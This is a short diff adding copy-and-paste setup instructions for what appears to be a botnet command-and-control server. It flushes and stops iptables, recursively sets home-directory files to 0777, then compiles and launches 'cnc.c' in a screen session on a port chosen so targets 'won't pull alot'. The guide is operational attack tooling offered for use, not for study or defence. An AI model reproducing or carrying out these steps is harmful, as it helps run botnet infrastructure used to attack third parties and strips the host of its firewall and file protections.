@@ -1,0 +1,29 @@
+// Copy paste this code and put it all on your terminal all at once:
+   sh installs.sh
+1  Stoping Iptables
+iptables -F; service iptables stop
+
+
+------------------------------------------------------------------------------
+
+cd ~/
+chmod 0777 * -R
+sh build.sh
+
+gcc cnc.c -o cnc -pthread -w
+
+screen -S cnc
+./cnc 69 850 (whatever port you want preferable a killable port so they won't pull alot)
+
+
+
+
+
+
+
+
+
+
+
+
+
